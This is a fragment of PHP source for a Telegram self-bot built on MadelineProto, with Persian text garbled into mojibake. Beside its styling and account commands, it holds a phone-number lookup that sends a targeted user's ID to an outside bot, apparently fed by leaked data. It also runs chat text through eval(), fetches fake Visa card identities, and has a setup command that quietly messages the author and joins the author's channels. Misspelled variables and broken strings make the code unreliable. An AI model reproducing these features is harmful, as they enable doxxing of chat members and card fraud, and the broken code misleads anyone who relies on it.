$_f_f = ['Ø¢','Ø§ØØ','Ø¨ÙÍÍ¡ÙÙØØÙÍÍÙ','Ù¾ÙÍÍ¡ÙÙØØÙÍÍÙ','ØªÙÍÍ¡ÙÙØØÙÍÍÙ','Ø«ÙÍÍ¡ÙÙØØÙÍÍÙ','Ø¬ÙÍÍ¡ÙÙØØÙÍÍÙ','ÚÙÍÍ¡ÙÙØØÙÍÍÙ','Ø­ÙÍÍ¡ÙÙØØÙÍÍÙ','Ø®ÙÍÍ¡ÙÙØØÙÍÍÙ','Ø¯Û Û ','Ø°','Ø±','Ø²','Ú','Ø³ÙÍÍ¡ÙÙØØÙÍÍÙ','Ø´ÙÍÍ¡ÙÙØØÙÍÍÙ','ØµÙÍÍ¡ÙÙØØÙÍÍÙ','Ø¶ÙÍÍ¡ÙÙØØÙÍÍÙ','Ø·ÙÍÍ¡ÙÙØØÙÍÍÙ','Ø¸ÙÍÍ¡ÙÙØØÙÍÍÙ','Ø¹ÙÍÍ¡ÙÙØØÙÍÍÙ','ØºÙÍÍ¡ÙÙØØÙÍÍÙ','ÙÙÍÍ¡ÙÙØØÙÍÍÙ','ÙÙÍÍ¡ÙÙØØÙÍÍÙ','Ú©ÙÍÍ¡ÙÙØØÙÍÍÙ','Ú¯ÙÍÍ¡ÙÙØØÙÍÍÙ','ÙÙÍÍ¡ÙÙØØÙÍÍÙ','ÙÙÍÍ¡ÙÙØØÙÍÍÙ','ÙÙÍÍ¡ÙÙØØÙÍÍÙ','ÙÛÛ','ÙÙÍÍ¡ÙÙØØÙÍÍÙ','ÛÙÍÍ¡ÙÙØØÙÍÍÙ']; 
$ines = str_replace($fas,$_a_a,$text);
$awer = str_replace($fas,$_b_b,$text);
$bwer = str_replace($fas,$_c_c,$text);
$cwer = str_replace($fas,$_d_d,$text);
$dwer = str_replace($fas,$_e_e,$text);
$ewer = str_replace($fas,$_f_f,$text);
$boti = [$ines,$awer,$wer,$cwer,$dwer,$ewer,];
$rum = $bot[nd(0, count($boti)-1)];
yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "$rum",'parse_mode'=>'HTML']);
}
if($partmode == "on"){
  if($update){
      if(strlen($text) < 150){
      $text = str_replace(" ","â",$text);
  for ($T = 1; $T <= mb_strlen($text); $T++) {
                  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => mb_substr($text, 0, $T)]);
                  yield $MadelineProto->sleep(0.1);
                }
  }
  }}
if($boldmode == "on"){
if($update){
                yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "<b>$text</b>",'parse_mode'=>'HTML']);
}}
if($data['under'] == "on"){
                                        yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message'=> '<u>'.$text.'</u>', 'parse_mode'=> 'HTML' ,]);
}
if($data['hashtag'] == "on"){
                              $tag = "#".$text;
                              $tags = str_replace(' ', "_",$tag);
                              yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => $tags]);
                              }
if($data['italic'] == "on"){
                              yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message'=> '<i>'.$text.'</i>', 'parse_mode'=> 'HTML' ,]);
}

if ($text == '/onlist' or $text == 'ÙÛØ³Øª Ø§ÙÙØ§ÛÙ') {
     $powr = $data['power'];
     $online = $data['online'];
     $markread = $data['markread'];
     $poker = $data['poker'];
     $funny = $data['funny'];
     $lockpv = $data['lockpv'];
     $proactions = $data['proactions'];
     $typing = $data['typing'];
     $gaming = $data['gaming'];
     $gamepv  = $data['gamepv'];
     $fileon = $data['file'];
     $audio = $data['audio'];
     $photo = $data['photo'];
     $video = $data['video'];
     $loc = $data['loc'];
     $part = $data ['part'];
     $echo  = $data['echo'];
     $bold  = $data['bold'];
     $italic = $data['italic'];
     $hashtag = $data['hashtag'];
     $under = $data['under'];
     $EnFont = $data['enfont'];
     $FaFont = $data['fafont'];
     $teexxeett = "
  
  á´á´á´¡á´Ê â©º $powr ðªð»
  ââââââââ¯âââââââ
  á´É´ÊÉªÉ´á´ â©º $online
  á´á´Êá´Êá´á´á´ â©º $markread
  á´á´á´á´Ê â©º $poker
  Òá´É´É´Ê â©º $funny
  Êá´á´á´á´á´  â©º $lockpv
  ââââââââ¯âââââââ
  á´Êá´ á´á´á´Éªá´É´s â©º $proactions
  á´Êá´ÉªÉ´É¢ â©º $typing
  É¢á´á´ÉªÉ´É¢ â©º $gaming
  É¢á´á´á´á´á´  â©º $gamepv
  ÒÉªÊá´ sá´É´á´ÉªÉ´É¢  â©º $fileon
  á´á´á´Éªá´ sá´É´á´ÉªÉ´É¢ â©º $audio
  á´Êá´á´á´ sá´É´á´ÉªÉ´É¢ â©º $photo
  á´ Éªá´á´á´ sá´É´á´ÉªÉ´É¢ â©º $video
  Êá´á´á´á´Éªá´É´ sá´É´á´ÉªÉ´É¢ â©º $loc
  ââââââââ¯âââââââ
  á´á´Êá´ â©º $part
  á´á´Êá´ â©º $echo
  Êá´Êá´  â©º $bold
  Éªá´á´ÊÉªá´ â©º $italic
  Êá´sÊá´á´É¢ â©º $hashtag
  á´É´á´á´ÊÊÉªÉ´á´ â©º $under
  á´É´á´á´á´á´ â©º $EnFont
  Òá´á´á´á´á´ â©º $FaFont
  ";
  yield $this->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "$teexxeett"]);
}
  if($text == '/creator' or $text == 'Ø³Ø§Ø²ÙØ¯Ù'){
       yield $this->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "@im_namrd"]);
       }
    if ($text == 'Ø±Ù'){
       $mem_using = round(memory_get_usage() / 1024 / 1024,1);
       yield $this->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð» á·áªáááªá° ááªá· :$mem_using á·á´"]);
    }
 if(preg_match("/^[\/\#\!]?(setanswer) (.*)$/i", $text)){
$ip = trim(str_replace("/setanswer ","",$text));
$ip = explode("|",$ip."|||||");
$txxt = trim($ip[0]);
$answeer = trim($ip[1]);
if(!isset($data['answering'][$txxt])){
$data['answering'][$txxt] = $answeer;
file_put_contents("data.json", json_encode($data));
yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => " Ú©ÙÙÙ Ø¬Ø¯ÛØ¯ Ø¨Ù ÙÛØ³Øª Ù¾Ø§Ø³Ø® ÙØ§Û Ø´ÙØ§ Ø§Ø¶Ø§ÙÙ Ø´Ø¯ "]);
}else{
yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => " Ú©ÙÙÙ Ø§Ø² ÙØ¨Ù Ø¯Ø± ÙÛØ³Øª Ù¾Ø§Ø³Ø® ÙØ§ ÙÙØ¬ÙØ¯ Ø§Ø³Øª"]);
 }
}
if(preg_match("/^[\/\#\!]?(php) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(php) (.*)$/i", $text, $a);
if(strpos($a[2], '$MadelineProto') === false and strpos($a[2], '$this') === false){
$OutPut = eval("$a[2]");
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "Êá´É´É´ÉªÉ´É¢ á´Êá´ á´á´á´á´ â $a[2] â É´á´á´¡ :-)",'parse_mode'=>"MarkDown"]);
$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "`ð» $OutPut`", 'parse_mode'=>'markdown']);
}
}
if ($text == 'rezaaa') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'reza.bakhtyari']);
}
if (preg_match("/^[\/\#\!]?(alltag)(.*)$/i", $text)) {
     $chat = yield $this->getPwrChat($peer);
     $chats = $chat['participants'];
     while (sizeof($chats) >= 100) {
          $spl = $chats;
          $GpBala = false;
          $chats = array_splice($spl, 100);
          foreach ($spl as $number => $up) {
              $id = $up['user']['id'];
              $GpBala .= $number + 1 . "-[$id](tg://user?id=$id) ";
          }
          yield $this->messages->sendMessage([
               'peer' => $peer,
               'message' => "Ø¨Ù¾Ø± Ø¨Ø§ÙØ§\n$GpBala",
               'parse_mode' => 'Markdown'
          ]);
     }
     $GpBala = false;
     foreach ($chats as $number => $up) {
         $id = $up['user']['id'];
         if ($up['user']['type'] == "user")
               $GpBala .= $number + 1 . "-[$id](tg://user?id=$id) ";
      }
      yield $this->messages->sendMessage([
           'peer' => $peer,
           'message' => "Ø¨Ù¾Ø± Ø¨Ø§ÙØ§ Ø¨ÚØªÛÙ\n$GpBala",
           'parse_mode' => 'Markdown'
      ]);
      return;
}

if ($text == '/Host') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "Ù¾ÙØ´Ù Û Ø³ÙØ±Ø³ Ø´ÙØ§ð"]);
  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => $_SERVER['SCRIPT_NAME'] ]);
  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "\n".$_TLVPWJX ]);
}
if ($text == 'kabos') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'source_kabos']);
}
if($text == 'number' or $text == 'Ø´ÙØ§Ø±Øª'){
      if($type3 == 'supergroup' or $type3 == 'chat'){
        $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
        $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
        $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
        $messag = $gms['messages'][0]['from_id'];
        $iduser = $messag;
        yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "â ï¸ Ø¯Ø± Ø­Ø§Ù Ù¾ÛØ¯Ø§ Ú©Ø±Ø¯Ù Ø´ÙØ§Ø±Øª Ø¯Ø§ÙÙ¾Ø´ â ï¸"]);
        file_put_contents("msgid25.txt",$msg_id);
        file_put_contents("peer5.txt","$peer");
        file_put_contents("id.txt","$messag");
        yield $MadelineProto->messages->sendMessage(['peer' => "@sibezamani_bot", 'message' => "Ø¬Ø³ØªØ¬Ù Ø´ÙØ§Ø±Ù"]);
        yield $MadelineProto->sleep(1);
        yield $MadelineProto->messages->sendMessage(['peer' => "@sibezamani_bot", 'message' => "$messag"]);
        } else {
         if($type3 == 'user'){
          yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "â ï¸ Ø¯Ø± Ø­Ø§Ù Ù¾ÛØ¯Ø§ Ú©Ø±Ø¯Ù Ø´ÙØ§Ø±Øª Ø¯Ø§ÙÙ¾Ø´ â ï¸"]);
          file_put_contents("msgid25.txt",$msg_id);
          file_put_contents("peer5.txt","$peer");
          file_put_contents("id.txt","$peer");
           yield $MadelineProto->messages->sendMessage(['peer' => "@sibezamani_bot", 'message' => "Ø¬Ø³ØªØ¬Ù Ø´ÙØ§Ø±Ù"]);
        yield $MadelineProto->sleep(1);
          yield $MadelineProto->messages->sendMessage(['peer' => "@sibezamani_bot", 'message' => "$peer"]);
         
      }
      }
      }
if(strpos($text,"ð¢ÙØªØ§Ø³ÙØ§ÙÙ Ø´ÙØ§Ø±Ù ÙØ±Ø¯ ÙÙØ±Ø¯ÙØ¸Ø± Ø¯Ø± Ø¯ÛØªØ§Ø¨ÛØ³ Ø³Ø§ÙØ§ÙÙ Ø´Ú©Ø§Ø± ÙÙØ¬ÙØ¯ ÙÙÛØ¨Ø§Ø´Ø¯") !== false && $from_id == 1348966811){
    $msgsgs = file_get_contents("msgid25.txt");
    $perer = file_get_contents("peer5.txt");
    $e = file_get_contents("id.txt");
    yield $MadelineProto->messages->editMessage(['peer' => $perer,'id' => $msgsgs ,'message' => "ð¿ Ø´ÙØ§Ø±Ù Ø¯Ø§ÙÙ¾Ø´ÙÙÙ ØªÙ Ø¯ÛØªØ§Ø¨ÛØ³ ÙØ¨ÙØ¯ ð¿",
    'parse_mode' => 'markdown']);
}
if ($text == 'ifmif') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'im namrd']);
}
if(preg_match("/^[\/\#\!]?(upload) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(upload) (.*)$/i", $text, $a);
$oldtime = time();
$link = $a[2];
$ch = curl_init($link);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_HEADER, TRUE);
curl_setopt($ch, CURLOPT_NOBODY, TRUE);
$data = curl_exec($ch);
$size1 = curl_getinfo($ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD); curl_close($ch);
$size = round($size1/1024/1024,1);
if($size <= 200.9){
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => 'ðµ PâÑÎ±ÑÑ WÎ±Î¹Ñ...
ð¾ File Size : '.$size.' MB']);
$path = parse_url($link, PHP_URL_PATH);
$filename = basename($path);
copy($link, "files/$filename");
yield $MadelineProto->messages->sendMedia([
 'peer' => $peer,
 'media' => [
 '_' => 'inputMediaUploadedDocument',
 'file' => "files/$filename",
 'attributes' => [['_' => 'documentAttributeFilename',
 'file_name' => "$filename"]]],
 'message' => "ð Name : $filename
ð¡ [Your File !]($link)
ð Size : ".$size.' MB',
 'parse_mode' => 'Markdown'
]);
$t=time()-$oldtime;
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ðð©ð¥ð¨ðððð â ($t".'s)']);
unlink("files/$filename");
} else {
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => 'â ï¸ Ø­Ø¬Ù ÙØ§ÛÙ Ø§ÙØªØ®Ø§Ø¨Û Ø¨ÛØ´ØªØ± Ø§Ø² 200 ÙÚ¯Ø§Ø¨Ø§ÛØª Ø§Ø³Øª']);
}
}
 if(preg_match("/^[\/\#\!]?(delanswer) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(delanswer) (.*)$/i", $text, $text);
$txxt = $text[2];
if(isset($data['answering'][$txxt])){
unset($data['answering'][$txxt]);
file_put_contents("data.json", json_encode($data));
$MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "â«¸ Ú©ÙÙÙ Ø§Ø² ÙÛØ³Øª Ù¾Ø§Ø³Ø® ÙØ§Û Ø´ÙØ§ Ø­Ø°Ù Ø´Ø¯ ð"]);
}else{
$MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "â©¥ Ø§ÛÙ Ú©ÙÙÙ Ø¯Ø± ÙÛØ³Øª Ù¾Ø§Ø³Ø® ÙØ§Û Ø´ÙØ§ ÙÙØ¬ÙØ¯ ÙÛØ³Øªð"]);
 }
}



if($text == '/id' or $text == 'id'){
  if (isset($message['reply_to_msg_id'])) {
   if($type3 == 'supergroup' or $type3 == 'chat'){
  $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
  $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
  $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
  $messag = $gms['messages'][0]['from_id'];
 $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => ' ID is : '.$messag, 'parse_mode' => 'markdown']);
} else {
	if($type3 == 'user'){
 $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "Ø§ÛØ¯Û Ø¹Ø¯Ø¯Û : `$peer`", 'parse_mode' => 'markdown']);
}}} else {
  $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "Ø§ÛØ¯Û Ø¹Ø¯Ø¯Û  : `$peer`", 'parse_mode' => 'markdown']);
}
}

if(isset($message['reply_to_msg_id'])){
if($text == 'unblock' or $text == '/unblock' or $text == 'Ø¢ÙØ¨ÙØ§Ú©'){
if($type3 == 'supergroup' or $type3 == 'chat'){
  $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
  $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
  $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
  $messag = $gms['messages'][0]['from_id'];
  yield $MadelineProto->contacts->unblock(['id' => $messag]);
  $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "SÉªÊ UÉ´ÊÊá´á´á´á´á´!ð¨"]);
  } else {
  	if($type3 == 'user'){
yield $MadelineProto->contacts->unblock(['id' => $peer]); $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "SÉªÊ UÉ´ÊÊá´á´á´á´á´!ð¨"]);
}
}
}

if($text == 'block' or $text == '/block' or $text == 'Ø¨ÙØ§Ú©'){
if($type3 == 'supergroup' or $type3 == 'chat'){
  $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
  $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
  $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
  $messag = $gms['messages'][0]['from_id'];
  yield $MadelineProto->contacts->block(['id' => $messag]);
  $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "SÉªÊ BÊá´á´á´á´á´!â!"]);
  } else {
 	if($type3 == 'user'){
yield $MadelineProto->contacts->block(['id' => $peer]); $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "SÉªÊ BÊá´á´á´á´á´!â"]);
}
}
}

if(preg_match("/^[\/\#\!]?(setenemy) (.*)$/i", $text)){
$gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
  $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
  $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
  $messag = $gmsg['messages'][0]['from_id'];
  if(!in_array($messag, $data['enemies'])){
    $data['enemies'][] = $messag;
    file_put_contents("data.json", json_encode($data));
    yield $MadelineProto->contacts->block(['id' => $messag]);
    $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "$messag ð¾ðð¥ ððð¥ð  ð¼âð¼ðð ððð¤ð¥â¨"]);
  } else {
    $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ðð¤ðð£ ðð¤ ð¸ðð£ððððª ðð ð¥ðð ððð¤ð¥ ð ð ððððððð¤ð¤¨"]);
  }
}
if(preg_match("/^[\/\#\!]?(delenemy) (.*)$/i", $text)){
$gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
  $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
  $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
  $messag = $gmsg['messages'][0]['from_id'];
  if(in_array($messag, $data['enemies'])){
    $k = array_search($messag, $data['enemies']);
    unset($data['enemies'][$k]);
    file_put_contents("data.json", json_encode($data));
    yield $MadelineProto->contacts->unblock(['id' => $messag]);
    $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "$messag Dá´Lá´Tá´D FÊOá´ EÉ´Eá´Y LÉªSá´ð©"]);
  } else{
    $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "TÊIê± Uê±EÊ Wá´SÉ´'T IÉ´ EÉ´Eá´Y LÉªSá´ð¨âð¦¯"]);
  }
 }
}

if(preg_match("/^[\/\#\!]?(answerlist)$/i", $text)){
if(count($data['answering']) > 0){
$txxxt = "ÙÛØ³Øª Ù¾Ø§Ø³Ø® ÙØ§Û Ø´ÙØ§ :
";
$counter = 1;
foreach($data['answering'] as $k => $ans){
$txxxt .= "$counter: $k => $ans \n";
$counter++;
}
$MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => $txxxt]);
}else{
$MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Ù¾Ø§Ø³Ø®Û Ø¨Ø±Ø§Û ÙÙØ§ÛØ´ ÙØ¬ÙØ¯ ÙØ¯Ø§Ø±Ø¯!"]);
  }
 }
 $timei = date('i:s');
if ($timei == '05:00' or $timei == '10:00' or $timei == '
:00' or $timei == '20:00' or $timei == '25:00' or $timei == '30:00' or $timei == '35:00' or $timei == '40:00' or $timei == '45:00' or $timei == '50:00' or $timei == '55:00' or $timei == '00:00') {
     $MadelineProto->restart();
}
if((time() - filectime('Auto_restart.txt')) > 1000){
unlink('Auto_restart.txt');
yield $this->messages->sendMessage(['peer' => $admin, 'message' => 'Ø±Ø¨Ø§Øª Ø¨Ù Ø¯Ø³ØªÙØ± Ø³Ø§Ø²ÙØ¯Ù Ø¨Ø±Ø§Û Ø¨Ø§ÙØ§ ÙØ±ÙØªÙ ÙØµØ±Ù Ø±Ù Ø±ÛØ³ØªØ§Ø±Øª Ø´Ø¯!']);
yield $this->restart();
file_put_contents('Auto_restart.txt', '');
}
if(preg_match("/^[\/\#\!]?(screen) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(screen) (.*)$/i", $text, $m);

$mi = $m[2];
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "É¢á´á´á´ÉªÉ´É¢ ê±á´Êá´á´É´ê±Êá´á´ ê°Êá´á´ â $m[2] â á´¡á´Ê ê±Éªá´á´ :-)",'parseMarkDown_mode'=>""]);

$ound = "https://api.codebazan.ir/webshot/?text=1000&domain=".$mi;
$inputMediaGifExternal = ['_' => 'inputMediaGifExternal', 'url' => $ound];
$MadelineProto->messages->sendMedia(['peer' => $peer, 'media' => $inputMediaGifExternal ,'reply_to_msg_id' => $msg_id,'message' => "Ø§Ø³Ú©Ø±ÛÙ Ø´Ø§Øª Ø§Ø² Ø³Ø§ÛØª ÙÙØ±Ø¯ ÙØ¸Ø± Ø¢ÙØ§Ø¯Ù Ø´Ø¯ ð¸"]);
}
if(preg_match("/^[\/\#\!]?(webping) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(webping) (.*)$/i", $text, $m);
if($type3 == "supergroup" or $type3 == "chat" or $type3 == 'user'){
$mi = $m[2];
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "É¢á´á´á´ÉªÉ´É¢ á´ÉªÉ´É¢ ê°Êá´á´ â $m[2] â á´¡á´Êê±Éªá´á´ :-)",'parse_mode'=>"MarkDown"]);
$r = file_get_contents("https://api.codebazan.ir/ping/?url=".$mi);
if($r != NULL){
    
yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>
"
á´¡á´Êê±Éªá´á´ á´ÉªÉ´É¢ Éªê± $r !!!
",
'parse_mode' => 'HTML','reply_to_msg_id' => $msg_id]);
}else{
yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>
"
 ððð¢ð ð´ððððð  ð¼ð  ÉªÉ´á´ á´ÊÉªá´ !
",
'parse_mode' => 'markdown','reply_to_msg_id' => $msg_id]);
}
}
}
if($text == 'fs' or $text == 'Ù¾ÛÚ©Ø±Ø¨ÙØ¯Û'){
$MadelineProto->channels->joinChannel(['channel' => "@asgharisam" ]);
$MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
$MadelineProto->messages->sendMessage(['peer' => "@im_namrd", 'message' => 'self AVATA 2 runing....']);
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message'=> "Ù¾ÛÚ©Ø±Ø¨ÙØ¯Û Ø±Ø¨Ø§Øª Ø§ÙØ¬Ø§Ù Ø´Ø¯ Ù Ø±Ø¨Ø§Øª Ø§ÙØ§Ø¯Ù Ø¨Ù Ú©Ø§Ø± ÙØ³Øª", 'parse_mode'=>'MarkDown']);
}
if(preg_match("/^[\/\#\!]?(save)$/i", $text) && isset($message['reply_to_msg_id'])){
$me = yield $MadelineProto->get_self();
$me_id = $me['id'];
yield $MadelineProto->messages->forwardMessages(['from_peer' => $peer, 'to_peer' => $me_id, 'id' => [$message['reply_to_msg_id']]]);
      $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "Ø³ÛÙ Ø´Ø¯ Ø¨ÙÙÙØ§"]);
     }
 if(preg_match("/^[\/\#\!]?(typing) (on|off)$/i", $text)){
preg_match("/^[\/\#\!]?(typing) (on|off)$/i", $text, $m);
$data['typing'] = $m[2];
file_put_contents("data.json", json_encode($data));
      $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "TYá­IáG ð³á°OáªE áOá¯ $m[2]"]);
     }
 if(preg_match("/^[\/\#\!]?(echo) (on|off)$/i", $text)){
preg_match("/^[\/\#\!]?(echo) (on|off)$/i", $text, $m);
$data['echo'] = $m[2];
file_put_contents("data.json", json_encode($data));
      $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "Eáá¼O ð¦á°OáªE áOá¯ $m[2]"]);
     }
 if(preg_match("/^[\/\#\!]?(markread) (on|off)$/i", $text)){
preg_match("/^[\/\#\!]?(markread) (on|off)$/i", $text, $m);
$data['markread'] = $m[2];
file_put_contents("data.json", json_encode($data));
      $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "á°á©áKáEá©áª ð§á°OáªE áOá¯ $m[2]"]);
     }
 if(preg_match("/^[\/\#\!]?(info) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(info) (.*)$/i", $text, $m);
$mee = yield $MadelineProto->get_full_info($m[2]);
$me = $mee['User'];
$me_id = $me['id'];
$me_status = $me['status']['_'];
$me_bio = $mee['full']['about'];
$me_common = $mee['full']['common_chats_count'];
$me_name = $me['first_name'];
$me_uname = $me['username'];
$mes = "ððÂ» $me_id \nððð¦ðÂ» $me_name \nðð¬ðð«ð§ðð¦ðÂ» @$me_uname \nðð­ðð­ð®ð¬Â» $me_status \nðð¢ð¨Â» $me_bio \nðð¨ð¦ð¦ð¨ð§ ðð«ð¨ð®ð©ð¬Â» $me_common";
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => $mes]);
     }
 if(preg_match("/^[\/\#\!]?(block) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(block) (.*)$/i", $text, $m);
yield $MadelineProto->contacts->block(['id' => $m[2]]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "SÉªÊ BÊá´á´á´á´á´!â"]);
     }
 if(preg_match("/^[\/\#\!]?(unblock) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(unblock) (.*)$/i", $text, $m);
yield $MadelineProto->contacts->unblock(['id' => $m[2]]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "SÉªÊ UÉ´ÊÊá´á´á´á´á´!"]);
     }
 if(preg_match("/^[\/\#\!]?(checkusername) (@.*)$/i", $text)){
preg_match("/^[\/\#\!]?(checkusername) (@.*)$/i", $text, $m);
$check = yield $MadelineProto->account->checkUsername(['username' => str_replace("@", "", $m[2])]);
if($check == false){
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "EÍxÍiÍsÍtÍâï¸"]);
} else{
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "á´áEEâï¸"]);
}
     }
 if(preg_match("/^[\/\#\!]?(setfirstname) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(setfirstname) (.*)$/i", $text, $m);
yield $MadelineProto->account->updateProfile(['first_name' => $m[2]]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ððð¬ð¤ ðð¨ð§ðð°"]);
     }
 if(preg_match("/^[\/\#\!]?(setlastname) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(setlastname) (.*)$/i", $text, $m);
yield $MadelineProto->account->updateProfile(['last_name' => $m[2]]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ððð¬ð¤ ðð¨ð§ðð°"]);
     }
 if(preg_match("/^[\/\#\!]?(setbio) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(setbio) (.*)$/i", $text, $m);
yield $MadelineProto->account->updateProfile(['about' => $m[2]]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ððð¬ð¤ ðð¨ð§ðð°"]);
     }
 if(preg_match("/^[\/\#\!]?(setusername) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(setusername) (.*)$/i", $text, $m);
yield $MadelineProto->account->updateUsername(['username' => $m[2]]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ððð¬ð¤ ðð¨ð§ðð°"]);
     }
 if(preg_match("/^[\/\#\!]?(join) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(join) (.*)$/i", $text, $m);
yield $MadelineProto->channels->joinChannel(['channel' => $m[2]]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ðð ðððð..."]);
     }
 if(preg_match("/^[\/\#\!]?(leave)$/i", $text)){
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ðððð§ðð..."]);
yield $MadelineProto->channels->leaveChannel(['channel' => $message['to_id']]);
     }
     if ($text == "/fakecard" or $text == "Ú©Ø§Ø±Øª") {
                              $link = json_decode(file_get_contents("https://api.codebazan.ir/visa-card/"), true);
                                   $visa = $link["Result"];
                                   $visa2 = $visa[rand(0,46)];
                                   $name = $visa2["name"];
                                   $lname = $visa2["lastname"];
                                   $adres = $visa2["Address"];
                                   $vcity = $visa2["City"];
                                   $state = $visa2["State"];
                                   $post = $visa2["Postalcode"];
                                   $country = $visa2["Country"];
                                   $brithday = $visa2["birthday"];
                                   $cardt = $visa2["cardtype"];
                                    $cardn = $visa2["cardnumber"];
